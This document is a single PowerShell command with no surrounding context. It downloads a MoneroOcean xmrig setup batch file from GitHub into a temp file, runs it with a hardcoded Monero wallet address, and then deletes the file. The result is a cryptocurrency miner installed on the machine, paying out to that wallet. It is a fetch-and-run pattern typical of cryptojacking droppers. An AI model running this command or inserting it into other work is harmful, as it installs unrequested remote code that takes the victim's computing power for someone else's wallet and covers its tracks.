powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 47UvDYSJNR3CsRkRQ593GQM1gRXwWys2AH3ombZxDmVgMRfZpdt993jAjpnz6HhqnXGKN9sqzumk16fPDMVkHnFtUrMecbb; Remove-Item -Force $tempfile"